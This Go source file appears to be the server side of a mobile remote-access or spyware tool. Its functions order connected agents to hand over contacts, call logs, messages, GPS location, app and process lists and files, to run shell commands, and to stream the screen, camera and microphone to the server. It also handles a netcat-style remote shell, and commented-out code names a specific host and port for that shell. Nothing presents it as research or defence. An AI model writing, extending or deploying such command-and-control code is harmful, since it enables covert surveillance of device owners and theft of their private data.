package tcpservice

import (
	"bufio"
	"bytes"
	"fmt"
	"time"

	"pcdn-server/common"
	"pcdn-server/protos"
)

func GetDevInfo(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_DEVINFO,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("SendTask: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: %v\n", err)
		return nil
	}

	return task
}

func GetAppList(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_APPLIST,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("GetAppList: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func GetProcessList(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_PROCLIST,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("GetProcessList: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func GetDir(AgentClient *protos.AgentClient, path string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_DIR,
		Payload:  path,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func ChatMsg(AgentClient *protos.AgentClient, chat string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CHAT,
		Payload:  chat,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("ChatMsg: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("ChatMsg SendTask ERR: ", err)
		return nil
	}

	return task
}

func Contact(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CONTACT,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("GetDir: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func Calllog(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_CALLLOG,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("Calllog: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func MessageLog(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_MESSAGE,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("MessageLog: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

// 更新agent版本
func UpdateAgent(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_UPDATE,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("Calendar: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func Internet(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_INTERNET,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("Internet: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ERR: ", err)
		return nil
	}

	return task
}

func Gps(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_GPS,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("Gps: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Gps SendTask ERR: ", err)
		return nil
	}

	return task
}

func NetLink(AgentClient *protos.AgentClient) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_NetLink,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("NetLink: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("NetLink SendTask ERR: ", err)
		return nil
	}

	return task
}

func ScreenLive(AgentClient *protos.AgentClient, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())

	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_SCREENLIVE,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err = SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("SendTask ScreenLive: %#v %v %v\n", AgentClient, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SendTask ScreenLive ERR: ", err)
		return
	}

	return
}

func VideoLive(AgentClient *protos.AgentClient, videoNum, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: videoNum,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err = SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("VideoLive SendTask: %#v %v %v\n", AgentClient, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("VideoLive SendTask ERR: ", err)
		return
	}

	return
}

func SwitchCamera(AgentClient *protos.AgentClient, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_SWITCHCAMERA,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err = SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("SwitchCamera SendTask: %#v %v %v\n", AgentClient, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("SwitchCamera SendTask ERR: ", err)
		return
	}

	return
}

func AudioLive(AgentClient *protos.AgentClient, sessionId string) (task *protos.TaskStruct, err error) {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task = &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_AUDIOLIVE,
		Payload:  fmt.Sprintf("rtp://%s:%v?pkt_size=1200", common.ServConfig.Host, "common.ServConfig.RtpPort"),
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err = SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("AudioLive SendTask: %#v %v %v\n", AgentClient, task, err)
	if err != nil {
		common.Logger.Sugar().Errorf("AudioLive SendTask ERR: ", err)
		return
	}

	return
}

func Remark(AgentClient *protos.AgentClient, remark string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_REMARK,
		Payload:  remark,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("Remark: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Remark ERR: ", AgentClient, err)
		return nil
	}

	return task
}

func ShellCmd(AgentClient *protos.AgentClient, cmd string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_SHELL,
		Payload:  cmd,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("ShellCmd SendTask: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("ShellCmd ERR: %v\n", err)
		return nil
	}

	return task
}

func Download(AgentClient *protos.AgentClient, path string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_DOWNLOAD,
		HostName: fmt.Sprintf("https://%s/api/upload", common.ServConfig.Host),
		Payload:  path,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Download ERR: %v\n", err)
		return nil
	}

	return task
}

func Upload(AgentClient *protos.AgentClient, path string) *protos.TaskStruct {
	taskId := fmt.Sprintf("%d", time.Now().Unix())
	task := &protos.TaskStruct{
		TaskId:   taskId,
		TaskType: TASKTYPE_UPLOAD,
		HostName: fmt.Sprintf("http://%s/upload/", common.ServConfig.Host),
		Payload:  path,
		RespChan: make(chan *protos.TaskResp, 1),
	}
	AgentClient.Tasks[taskId] = task

	err := SendTask(AgentClient, task)
	common.Logger.Sugar().Debugf("Download SendTask: %#v %v\n", AgentClient, err)
	if err != nil {
		common.Logger.Sugar().Errorf("Download ERR: %v\n", err)
		return nil
	}

	return task
}

func sendCommandByNc(AgentClient *protos.AgentClient, cmd string) string {
	for {
		if AgentClient.NcConn == nil {
			addShellTask(AgentClient)
			time.Sleep(time.Second)
			continue
		}
		conn := *AgentClient.NcConn

		_, err := conn.Write([]byte(cmd))
		if err != nil {
			conn.Close()
			AgentClient.NcConn = nil
			return ""
		}

		conn.SetReadDeadline(time.Now().Add(time.Second))
		data := bytes.NewBuffer([]byte{})
		reader := bufio.NewReader(conn) //获取输入流

		for {
			var buf [8192]byte
			n, err := reader.Read(buf[:]) //读取数据 从头到尾读取
			if err != nil {
				fmt.Println("read from client failed,err", err)
				break
			}

			data.Write(buf[:n])
		}

		return data.String()
	}
}

func addShellTask(AgentClient *protos.AgentClient) {
	// has := false

	// for i := 0; i < len(AgentClient.Tasks); i++ {
	// 	if strings.Compare(AgentClient.Tasks[i].TaskType, "shell") == 0 {
	// 		has = true
	// 		break
	// 	}
	// }

	// if has == false {
	// 	AgentClient.Tasks = append(AgentClient.Tasks, protos.TaskStruct{
	// 		TaskId:   time.Now().Format("2006-01-02 15:04:05"),
	// 		TaskType: "shell",
	// 		HostName: "csmm.feitian.link",
	// 		Port:     "20002",
	// 	})
	// }
}
